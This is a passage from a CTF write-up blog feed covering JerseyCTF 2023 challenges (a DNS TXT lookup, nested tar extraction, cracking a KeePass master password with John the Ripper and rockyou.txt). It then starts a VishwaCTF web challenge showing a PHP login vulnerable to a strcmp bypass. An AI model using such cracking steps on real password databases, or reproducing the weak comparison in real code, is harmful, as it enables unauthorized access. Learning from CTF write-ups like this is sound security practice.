&lt;p&gt;&lt;code&gt;Flag : jctf{i_&amp;lt;3_5tr1Ng5_59af0c0ed}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;osint-record-me&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#osint-record-me&quot; aria-label=&quot;Anchor link for: osint-record-me&quot;&gt;OSINT - record-me&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_record.png&quot; alt=&quot;recordme&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge is highlighting &lt;code&gt;record&lt;&#x2F;code&gt; and &lt;code&gt;jerseyctf.com&lt;&#x2F;code&gt;. So, I search for all the DNS records of jerseyctf.com.&lt;&#x2F;p&gt;
&lt;p&gt;I search all the &lt;code&gt;whois&lt;&#x2F;code&gt; records of the jerseyctf.com. And in there a string &lt;code&gt;pw-d714d7aa25df63925ec2b3893928671b&lt;&#x2F;code&gt;. As they are talking about password &lt;code&gt;pw&lt;&#x2F;code&gt; tempts me to submit it as flag.&lt;br&gt;But afer many unsuccesful tries I tried &lt;code&gt;dig&lt;&#x2F;code&gt; to fetch &lt;code&gt;DNS records&lt;&#x2F;code&gt; of jerseyctf.com.&lt;&#x2F;p&gt;
&lt;p&gt;And finally the flag is available at &lt;code&gt;TXT records&lt;&#x2F;code&gt; of jerseyctf.com. I used &lt;code&gt;dig&lt;&#x2F;code&gt; to do it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;osint$&lt;&#x2F;span&gt;&lt;span&gt; dig jerseyctf.com txt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &amp;lt;&amp;lt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; DiG &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;9.18.12-0ubuntu0.22.04.1-Ubuntu &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; jerseyctf.com txt
&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;global&lt;&#x2F;span&gt;&lt;span&gt; options: +cmd
&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Got&lt;&#x2F;span&gt;&lt;span&gt; answer:
&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;HEADER&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&amp;lt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;opcode&lt;&#x2F;span&gt;&lt;span&gt;: QUERY, status: NOERROR, id: 48664
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; OPT PSEUDOSECTION:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;; EDNS: version: 0, flags:; udp: 65494
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; QUESTION SECTION:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;jerseyctf.com.			IN	TXT
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; ANSWER SECTION:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;jerseyctf.com.		3600	IN	TXT	&amp;quot;jctf{hop_OFF_TIKTOK_and_GET_s0me_SUN_OUTSID3!}&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; Query time: 732 msec
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; WHEN: Fri Apr 21 12:14:36 IST 2023
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;;; MSG SIZE  rcvd: 101
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{hop_OFF_TIKTOK_and_GET_s0me_SUN_OUTSID3!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;osint-geo-guess&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#osint-geo-guess&quot; aria-label=&quot;Anchor link for: osint-geo-guess&quot;&gt;OSINT - geo-guess&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_geoguess.png&quot; alt=&quot;geoguess&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, its clear that we have to find the name of the building given in the picture.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_geoguess1.png&quot; alt=&quot;geo&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I did a quick google image search and found the building name right on the top of result.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_geoguess2.png&quot; alt=&quot;geo&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: jctf{west-edmonton-mall}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;misc-pits-of-tartarus&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc-pits-of-tartarus&quot; aria-label=&quot;Anchor link for: misc-pits-of-tartarus&quot;&gt;Misc - pits-of-tartarus&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_pits.png&quot; alt=&quot;pits&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The attached file : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;jerseyctf23&#x2F;file834.tar.gz&quot; download&gt;file834.tar.gz&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This tar is a hundrends of recompressions of tar.gz&lt;&#x2F;p&gt;
&lt;p&gt;So, I run this command to loop over all the compressions in it and extract the files.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; for i in {834..1}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;tar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -xf&lt;&#x2F;span&gt;&lt;span&gt; file$i.tar.gz&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rm&lt;&#x2F;span&gt;&lt;span&gt; file$i.tar.gz&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;done
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;file0.tar.gz
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The above command will extract the zips and deletes it prior zip to make directory clean. As we can see now &lt;code&gt;file0.tar.gz&lt;&#x2F;code&gt; is the last one left.&lt;&#x2F;p&gt;
&lt;p&gt;Again this &lt;code&gt;file0.tar.gz&lt;&#x2F;code&gt; contains zips from file-1.tar.gz, and so on. So i extracted file0.tar.gz just one time then modified above command lil bit to extract this sequece of tars.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; tar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -xf&lt;&#x2F;span&gt;&lt;span&gt; file0.tar.gz
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;file-1.tar.gz
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; for i in {1..833}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;tar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -xf&lt;&#x2F;span&gt;&lt;span&gt; file-$i.tar.gz&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rm&lt;&#x2F;span&gt;&lt;span&gt; file-$i.tar.gz&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;done
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;tar:&lt;&#x2F;span&gt;&lt;span&gt; file-390.tar.gz: Cannot open: No such file or directory
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;tar:&lt;&#x2F;span&gt;&lt;span&gt; Error is not recoverable: exiting now
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;file.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; cat file.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;jctf{N0t_$&lt;&#x2F;span&gt;&lt;span&gt;tuck_in_tHe_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@r&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I assumed that there will be again 834 zips so I tried the above loop. But actually there were only &lt;code&gt;389&lt;&#x2F;code&gt; tars. Eventhough the above command extracted the file that we want but returned some error. The flag is present in &lt;code&gt;file.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{N0t_$tuck_in_tHe_t@r}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;misc-crack-keepass&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc-crack-keepass&quot; aria-label=&quot;Anchor link for: misc-crack-keepass&quot;&gt;Misc - crack-keepass&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_keepass.png&quot; alt=&quot;keepass&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached file : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;jerseyctf23&#x2F;Databse.kdbx&quot; download&gt;Databse.kdbx&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This time I installed &lt;code&gt;keepassx&lt;&#x2F;code&gt; on my machine.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; sudo apt install keepassx
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And I Opened the Database.kdbx with kepassx GUI app. It prompts me for a master password. As the challenge hints that crack, I cracked it with &lt;code&gt;JOHN&lt;&#x2F;code&gt; and &lt;code&gt;rockyou.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; keepass2john Database.kdbx &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; database_hashes_new.hash
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;misc$&lt;&#x2F;span&gt;&lt;span&gt; john&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --wordlist&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -format&lt;&#x2F;span&gt;&lt;span&gt;:keepass databse_hashes_new.hash
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Using&lt;&#x2F;span&gt;&lt;span&gt; default input encoding: UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Loaded&lt;&#x2F;span&gt;&lt;span&gt; 1 password hash (KeePass &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;SHA256 AES 32&#x2F;64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Cost&lt;&#x2F;span&gt;&lt;span&gt; 1 (iteration count) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;is&lt;&#x2F;span&gt;&lt;span&gt; 60000 for all loaded hashes
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Cost&lt;&#x2F;span&gt;&lt;span&gt; 2 (version) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;is&lt;&#x2F;span&gt;&lt;span&gt; 2 for all loaded hashes
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Cost&lt;&#x2F;span&gt;&lt;span&gt; 3 (algorithm &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;0=AES, 1=TwoFish, 2=ChaCha&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;is&lt;&#x2F;span&gt;&lt;span&gt; 0 for all loaded hashes
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Press &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;q&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt; or Ctrl-C to abort, almost any other key for status
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1jersey&lt;&#x2F;span&gt;&lt;span&gt;          (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1g&lt;&#x2F;span&gt;&lt;span&gt; 0:01:57:04 DONE (2023-04-16 16:24) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0.000142g&#x2F;s&lt;&#x2F;span&gt;&lt;span&gt; 53.41p&#x2F;s 53.41c&#x2F;s 53.41C&#x2F;s 1jersey
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Use&lt;&#x2F;span&gt;&lt;span&gt; the &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;--show&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; option to display all of the cracked passwords reliably
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Session&lt;&#x2F;span&gt;&lt;span&gt; completed
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Master key of the database is &lt;code&gt;1jersey&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;So, I opened it the database file with master key. When I am navigating through the database file in keepassx app. I found a file named &lt;code&gt;flag&lt;&#x2F;code&gt; in General category.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{pr073c7_y0ur_v4ul7}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Vishwa CTF 2023</title>
        <published>2023-04-03T00:00:00+00:00</published>
        <updated>2023-04-03T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/vishwactf23/"/>
        <id>https://themj0ln1r.github.io/writeups/vishwactf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/vishwactf23/">&lt;p&gt;Hello mates! I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1904&#x2F;&quot; target=_blank&gt;VishwaCTF 2023&lt;&#x2F;a&gt; which was happened from 31 Mar to 3 Apr. I played it with the team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;217079&quot;&gt;Invaders0x1&lt;&#x2F;a&gt;.
These are the challenges i have solved during CTF.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_progress.png&quot; alt=&quot;Progess&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;web-eeezzy&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#web-eeezzy&quot; aria-label=&quot;Anchor link for: web-eeezzy&quot;&gt;WEB-Eeezzy&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_eezzy1.png&quot; alt=&quot;Eeezzy&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge is at &lt;strong&gt;https:&#x2F;&#x2F;ch41272110703.ch.eng.run.&lt;&#x2F;strong&gt; It is a login page with fields username and password.&lt;&#x2F;p&gt;
&lt;p&gt;First, I did &lt;code&gt;ctrl+u&lt;&#x2F;code&gt; üòâ. It shows a &lt;code&gt;view.php&lt;&#x2F;code&gt; in onclick function.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_eezzy2.png&quot; alt=&quot;Eeezzy src&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Visiting &lt;strong&gt;https:&#x2F;&#x2F;ch41272110703.ch.eng.run&#x2F;view.php&lt;&#x2F;strong&gt; results the following code&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;session_start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    $_SESSION[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;status&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;null&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    $flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span&gt;($_GET[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;username&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span&gt;($_GET[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;password&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;])) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;strcmp&lt;&#x2F;span&gt;&lt;span&gt;($_GET[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;username&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;$flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;strcmp&lt;&#x2F;span&gt;&lt;span&gt;($_GET[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;password&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;$flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
